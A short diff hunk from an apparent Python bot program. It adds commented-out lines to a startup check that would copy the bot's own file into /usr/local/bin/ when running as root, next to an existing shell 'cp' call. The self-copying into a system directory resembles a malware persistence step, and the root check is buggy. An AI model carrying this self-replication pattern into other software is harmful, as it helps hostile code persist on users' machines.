@@ -353,6 +353,9 @@ def srtChk(): # Startup Check. (Still in testing!)
                     print("Bot File Exists: " + clone)
             else:
                 if name != clone:
+                    # Need to check root permissions to copy to /usr/local/bin/.
+                    #if os.getuid() == 'root':
+                        #shutil.copyfile(name, '/usr/local/bin/')
                     if debugmode: # If debugmode is True, msgs will print to screen.
                         print("Copying " + name + " to: " + clone)
                     #os.system("cp " + name + " " + clone)
